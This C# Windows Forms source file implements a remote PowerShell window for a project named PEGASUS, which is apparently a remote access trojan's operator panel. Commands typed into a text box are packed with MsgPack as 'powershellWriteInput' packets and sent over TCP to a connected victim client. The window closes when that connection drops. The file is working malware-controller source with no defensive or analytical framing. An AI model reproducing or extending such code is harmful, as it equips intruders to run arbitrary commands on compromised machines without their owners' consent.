using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormPowerShell : Form
    {
        public FormPowerShell()
        {
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients Client { get; set; }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void FormPowerShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            ExitShell();
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }

        private void ExitShell()
        {
            try
            {
                Client?.Disconnected();
            }
            catch
            {
            }
        }


        private void panel1_MouseDown_1(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void pictureBox8_Click_1(object sender, EventArgs e)
        {
            Close();
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (Client != null)
                if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
                {
                    if (textBox1.Text == "cls".ToLower())
                    {
                        richTextBox1.Clear();
                        textBox1.Clear();
                        return;
                    }

                    if (textBox1.Text == "exit".ToLower())
                    {
                        ExitShell();
                        Close();
                    }

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "powershellWriteInput";
                    msgpack.ForcePathObject("WriteInput").AsString = textBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    textBox1.Clear();
                }
        }
    }
}